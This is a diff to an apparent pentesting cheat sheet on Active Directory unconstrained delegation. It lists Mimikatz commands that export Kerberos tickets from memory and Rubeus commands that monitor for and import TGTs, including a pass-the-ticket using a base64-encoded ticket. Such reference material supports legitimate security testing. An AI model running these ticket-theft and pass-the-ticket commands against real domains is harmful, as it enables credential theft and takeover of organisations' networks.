@@ -208,15 +208,24 @@ Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
 ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
 
 
-# Export tickets with Mimikatz
+# Mimikatz
+## Export tickets  
 privilege::debug
 sekurlsa::tickets /export #Recommended way
 kerberos::list /export #Another way
-
+## import ticket
 kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[0;3c785]-2-0-40e10000-Administrator@krbtgt-OFFENSE.LOCAL.kirbi
 
-# Monitor logins and export new tickets
+# Rubeus
+## Monitor logins and export new tickets
 .\Rubeus.exe monitor /targetuser:<username> /interval:10 #Check every 10s for new TGTs
+## import ticket
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+## import ticket base64
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
+Rubeus.exe ptt /ticket:<base64 ticket>
+
+
 ```
 
 ## Constrained Delegation
